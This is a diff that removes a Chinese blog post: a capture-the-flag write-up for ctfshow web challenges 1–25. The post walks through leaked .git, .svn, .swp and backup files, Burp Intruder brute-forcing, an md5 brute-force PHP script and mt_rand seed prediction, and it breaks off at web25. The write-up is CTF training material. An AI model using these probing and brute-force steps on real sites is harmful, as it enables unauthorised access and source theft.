@@ -1036,346 +1036,6 @@ nginx默认日志位置：/var/log/nginx/access.log<br>
       </tags>
   </entry>
   <entry>
-    <title>Web1000题系列修炼(一)</title>
-    <url>/posts/14827/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>这个web系列题是前些日子我随意逛逛的时候，在ctfshow平台上发现的，正好web太菜了，借由这个系列题开始自我修炼吧😖</p>
-<h2 id="信息收集-1-20"><a class="header-anchor" href="#信息收集-1-20">¶</a>信息收集(1-20)</h2>
-<h3 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h3>
-<p>右键查看源码就能看到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web1/%24A%60L%5D%280Z%28L%24%5DUO3%60QC03%5B0K.png" alt=""></p>
-<h3 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h3>
-<p>打开网页提示无法查看源代码，右键也使用不了，那我们就在url前面加上<code>view-source:</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;83a83588-671e-4a94-9c6f-6857f9e20c2f.chall.ctf.show&#x2F;</span><br></pre></td></tr></table></figure>
-<p>访问后即可获得flag</p>
-<h3 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h3>
-<p>右键源码也没看到信息，去查看一下请求头和响应头，在响应头这里找到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web3/58CPJ8K6U1MK55EAIOYX6%24D.png" alt=""></p>
-<h3 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h3>
-<p>题目提示robots，所以我们直接访问<code>http://c6f215bf-6c3e-4a21-949b-1c37d603ca56.chall.ctf.show/robots.txt</code><br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web4/%28SHD3YCKR5EX_PFSJJJ~%28KT.png" alt=""><br>
-然后根据提示，再访问flagishere.txt，即可得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web4/8S25%29G2%40%25%7BLSCUTWJL%24FJJ1.png" alt=""></p>
-<h3 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h3>
-<p>题目提示是phps源码泄露，于是在index.php后面加上s，即构造url如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;69ba9522-1aaf-4726-b2df-360c5c88d1ac.chall.ctf.show&#x2F;index.phps</span><br></pre></td></tr></table></figure>
-<p>访问后弹出一个下载文件，下载后打开文件得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web5/XL%7D%60G7X%5BG1ZPH%60HYCE__%40%7DR.png" alt=""></p>
-<h3 id="web6"><a class="header-anchor" href="#web6">¶</a>web6</h3>
-<p>题目提示www.zip源码泄露，于是构造url访问下载压缩包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;www.zip</span><br></pre></td></tr></table></figure>
-<p>在压缩包中有一个fl000g.txt文件，打开内容为：flag{flag_here}，本来以为这是flag，然后提交错误了。接着访问</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure>
-<p>得到正确的flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web6/%29%29EZQI_I6W%60%25OY7_%28GGJI%5B9.png" alt=""></p>
-<h3 id="web7"><a class="header-anchor" href="#web7">¶</a>web7</h3>
-<p>根据提示，是个git泄露问题，访问.git/index.php即可，即构造url如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e85f4c26-faf9-4ace-a049-4f1b4587ad44.chall.ctf.show&#x2F;.git&#x2F;index.php</span><br></pre></td></tr></table></figure>
-<p>访问后就能得到flag</p>
-<h3 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h3>
-<p>根据提示，本题考查的是svn泄露</p>
-<blockquote>
-<p>SVN（subversion）是源代码版本管理软件。 在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。 在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p>
-</blockquote>
-<p>我们构造url访问，即可获得flag</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a79a4695-f024-44dd-af3e-4eb6c2720be7.chall.ctf.show&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
-<h3 id="web9"><a class="header-anchor" href="#web9">¶</a>web9</h3>
-<p>本题考查的是vim的缓存泄露</p>
-<blockquote>
-<p>vim编辑文本时会创建一个临时文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。而本题的情景就是电脑死机了意外退出，导致存在临时文件</p>
-</blockquote>
-<p>构造url如下，下载.swp后缀结尾的文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0b4ba9f5-92a1-42fa-ba28-49cff3f8400e.chall.ctf.show&#x2F;index.php.swp</span><br></pre></td></tr></table></figure>
-<p>打开文件即可获取flag</p>
-<h3 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h3>
-<p>题目提示cookie，然后我们查看一下请求头，发现cookie数据为flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web10/5%5BL%7B~%7BV%24%245%254B7%5D67~%29B5CX.png" alt=""><br>
-我们解一下url编码，得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web10/%5DCN%2579K%24A9%280%24%60%240_TOFG%28E.png" alt=""></p>
-<h3 id="web11"><a class="header-anchor" href="#web11">¶</a>web11</h3>
-<p>根据提示，查询对ctfshow域名进行dns查询，查看TXT记录<br>
-阿里云查询链接：<a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a><br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web11/RDP905P_SOZF0HM725N3%7DJV.png" alt=""><br>
-获取flag成功</p>
-<h3 id="web12"><a class="header-anchor" href="#web12">¶</a>web12</h3>
-<p>根据题目提示，我们访问robots.txt，获取到后台地址<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/%24%24%28H%2954_BF%5DPS%7B06RN_M%7B7O.png" alt=""><br>
-然后我们访问一下后台</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c25a456d-63f7-497e-9170-0365a9cdce53.chall.ctf.show&#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/3UKIBC9YJVM%40%7D6V%29O%28LT%291G.png" alt=""><br>
-账号名直接盲猜admin，密码是网站底部的这串数字，372619038<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/ZIA0BV2O2KFNIR~5%24%282T2DN.png" alt=""><br>
-登录进来后，获取到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/OD2%603%24A%4083R%5BL%287A%5DGC%24Z%5B2.png" alt=""></p>
-<h3 id="web13"><a class="header-anchor" href="#web13">¶</a>web13</h3>
-<p>在网站找到一个超链接<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/JDUYP_%7D%24%24HV%5B%7BUGOENSK%7BLB.png" alt=""><br>
-访问后，发现开发者在文档中写了自己的后台地址和账号密码<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/Q%25%25%40CO8%29ZM%40M1%29_%7BMLDU6P6.png" alt=""><br>
-这里把your-domain换成自己的做题环境，访问后台地址</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e63907cd-33af-4c57-b605-4f7e04928e43.chall.ctf.show&#x2F;system1103&#x2F;login.php</span><br></pre></td></tr></table></figure>
-<p>输入账号和密码后得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/1G7F~2%7D~NO048WQL%5D1LFUTR.png" alt=""></p>
-<h3 id="web14"><a class="header-anchor" href="#web14">¶</a>web14</h3>
-<p>打开网站，根据提示访问<code>http://4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show/editor/</code><br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/Y%5B8CN%60PAKNL%7BV%25SICU%60LH56.png" alt=""><br>
-看到一个编辑器，在flash的上传中，发现有个文件空间<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/617KH%5BRRFKY%5D4L%5BI%5DW~UXA3.png" alt=""><br>
-点击文件空间，发现爆出了目录<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%25U17ETN4D42GP3~TG%7D%25N3M8.png" alt=""><br>
-找了找，flag在var/www/html/nothinghere/fl000g.txt中，于是构造url访问</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show&#x2F;nothinghere&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure>
-<p>得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%60_%28G6DSOG5TBQLZLDH08F7V.png" alt=""></p>
-<h3 id="web15"><a class="header-anchor" href="#web15">¶</a>web15</h3>
-<p>根据题目提示邮箱，在网页底部发现一个邮箱<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/HK_MLVPS3%246282SAV6YPFIM.png" alt=""><br>
-再url后面加上admin访问一下后台<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/VFRR%5DS8%60%60%7DV7%5D%251%25_2QAGS7.png" alt=""><br>
-有一个忘记密码选项，点击一下<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/%24OSUPYKMZZOORSX80VE63S2.png" alt=""><br>
-有密保问题，联想到qq邮箱，搜索一下qq<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/8%24BYJYK%5B7%251M3N0TF%60F%60VK2.png" alt=""><br>
-得到地址为西安，于是提交西安<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/I%5D%5B9%7BXDD98TS%5BMO%5DB%28_%7B%29%60P.png" alt=""><br>
-得到密码为admin7789，账号还是admin，登录后获得flag</p>
-<h3 id="web16"><a class="header-anchor" href="#web16">¶</a>web16</h3>
-<p>根据题目提示，存在探针</p>
-<blockquote>
-<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。<br>
-比如查看服务器支持什么，不支持什么，空间速度等等状况！</p>
-</blockquote>
-<p>于是访问<code>http://e42c0d7a-d052-485d-bb09-a7c68a6d0214.chall.ctf.show/tz.php</code><br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/CL_7ZWZ3%24~0%7D3D0Q1PPD86H.png" alt=""><br>
-再点击phpinfo查看信息<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/_NM4E%5B4%60TFQ%7DPP%60%240P2A~72.png" alt=""><br>
-在页面搜索一下ctfshow，即可得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/MK%7B%28X5DI52%29LVAPG%7D%7BTJSQE.png" alt=""></p>
-<h3 id="web17"><a class="header-anchor" href="#web17">¶</a>web17</h3>
-<p>根据题目，查找ctfer.com的真实ip，于是用fofa查找<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web17/%7BE3HVN%5DBT7C7%7BR%29_G%7DL%29ODI.png" alt=""><br>
-查到ip地址为：111.231.70.44，所以flag为：flag{111.231.70.44}</p>
-<h3 id="web18"><a class="header-anchor" href="#web18">¶</a>web18</h3>
-<p>打开是一个游戏，我们去找找它的文件，在js中发现了当分数大于100时，赋值的一串编码<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/_%60NIPJPH%606XG7%7BHCOPOJMWC.png" alt=""><br>
-我们拿去unicode解码一下<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/WHIID%5B%5BUR1Y%5DOL_G0K7H%247G.png" alt=""><br>
-根据提示，访问110.php，构造url</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;884e39f8-376a-4d61-9618-ee22fecc3327.chall.ctf.show&#x2F;110.php</span><br></pre></td></tr></table></figure>
-<p>访问后得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/%60OO6K~50K%60A%7B~0EC%24G%5D_52N.png" alt=""></p>
-<h3 id="web19"><a class="header-anchor" href="#web19">¶</a>web19</h3>
-<p>打开是一个登录框，右键查看一下源码<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web19/_KY%7DOY%5BDG6ICR%5DH9U~N%600%28E.png" alt=""><br>
-根据php源码，我们需要post发送用户名和密码过去</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当用户名为admin</span><br><span class="line">密码为a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br><span class="line">即可输出flag</span><br></pre></td></tr></table></figure>
-<p>构造发送post请求<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web19/%5DK48MGWOC%243%2555U6R%28YHEWA.png" alt=""><br>
-成功获取flag</p>
-<h3 id="web20"><a class="header-anchor" href="#web20">¶</a>web20</h3>
-<p>根据题目提示，是mdb文件泄露</p>
-<blockquote>
-<p>mdb文件是早期asp+access构架的数据库文件</p>
-</blockquote>
-<p>于是我们访问/db/db.mdb，即构造url如下访问</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5c070a5e-3a51-4904-a668-4385dfa7e714.chall.ctf.show&#x2F;db&#x2F;db.mdb</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web20/A%60M~%5B%5B9GGXE8%7DAG4%7D%29V2~6H.png" alt=""><br>
-下载db.mdb文件后，用记事本打开搜索flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web20/G8QY%29JHUVWV%60KE%40MU9K%7BXOT.png" alt=""><br>
-成功获取到flag</p>
-<h2 id="爆破-21-28"><a class="header-anchor" href="#爆破-21-28">¶</a>爆破(21-28)</h2>
-<h3 id="web21"><a class="header-anchor" href="#web21">¶</a>web21</h3>
-<p>题目给了一个zip文件，打开后解压是爆破的字典，我们抓包一下网址看看<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/%7DJ%7BI5%243FC%5D0~HWVBF9YEZAA.png" alt=""><br>
-发现账号和密码都被base64了，我们发送到intruder模块，给爆破的位置加上$符圈住<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CNNU1O4C%40XHK3Y5JORN%60Q1V.png" alt=""><br>
-去base64解码一下看看格式<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/XNGZCN%286QM%40%40S%40%29%5DCDH5810.png" alt=""><br>
-格式是账号:密码，那我们使用custom iterator(自定义迭代器)模块，首先第一个放账号admin<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CVUBPQE_TDC%60%282%7BNFWNJN66.png" alt=""><br>
-第二个放符号<code>:</code><br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/EE%24R8%28LNP_D4TP6_LGD%40WBX.png" alt=""><br>
-第三个放题目给的字典<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/YDJT6U%5B3%7B%7B%5BW3%24LTQU%40S2I7.png" alt=""><br>
-接着再进行base64编码，还有把后面这个url编码字符最好取消掉<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/BG65%608Y%28U%5D%5BZ_Z0Q9PIR%7B%40V.png" alt=""><br>
-然后就是attack开始爆破了<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/I%40HP%40S%299HT%5DREAIMIUYYV8K.png" alt=""><br>
-爆破出密码，成功获得flag</p>
-<h3 id="web22"><a class="header-anchor" href="#web22">¶</a>web22</h3>
-<p>题目让我们去爆破ctfer.com域名，也就是去爆破子域名，直接上layer<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/CNI3BQ%29BITHJIJ~2%7B6E%5DFC6.png" alt=""><br>
-爆破出有flag的子域名，访问后得到flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/WW7DID%7BTYG1US%60G6%244MWXJI.png" alt=""></p>
-<h3 id="web23"><a class="header-anchor" href="#web23">¶</a>web23</h3>
-<p>打开看到php源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-<p>代码审计一下，输出flag需要满足两个条件</p>
-<blockquote>
-<p>第一，传入的token值经过md5加密后，第1位=第14位并且第14位=第17位<br>
-第二，第1位+第14位+第17位÷第1位等于第31位</p>
-</blockquote>
-<p>根据源码改一下，写个脚本</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   10:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$dict = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt; <span class="number">36</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;<span class="number">36</span>;$j++)&#123;</span><br><span class="line">        $token = md5($dict[$i].$dict[$j]);</span><br><span class="line">        <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;加密后的md5值为：&quot;</span>.$token).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;解密后的值为：&quot;</span>.$dict[$i].$dict[$j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>运行后得到满足的值，即3j<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/1%40X%282I%7D%29WT%40%7DX%7B%7BC%7B%7DW%5BYO3.png" alt=""><br>
-于是构造url传参token=3j，获得flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/%7DMZ8I%5BI%5BR%2441YZ%29P0%5DA8TU9.png" alt=""></p>
-<h3 id="web24"><a class="header-anchor" href="#web24">¶</a>web24</h3>
-<p>审计代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现其实这是伪随机数，因为mt_srang已经固定了，我们写个代码运行一下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line">$result = intval(mt_rand());</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/7%28XX9%5BUBRX8TG%60%5BP4F8M%29%5BA.png" alt=""><br>
-得到1155388967，所以构成?r=1155388967即可获得flag<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/N9%294NSPFPC1BUE%28KK%24%7B7Q7R.png" alt=""></p>
-<h3 id="web25"><a class="header-anchor" href="#web25">¶</a>web25</h3>
-<p>首先审计代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!$rand))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-<p>这次种子没有给出，但发现一个关键地方，就是我们可以把传入的r设置为0，即?r=0，可以输出$rand的值，此时$rand=mt_rand()的值，也就是随机数的值<br>
-<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/NM0%607T~RI%28QV7UQDCA%5B5%7DQT.png" alt=""><br>
-获得随机数为86715576，这个时候我们使用逆推工具尝试逆推出种子</p>
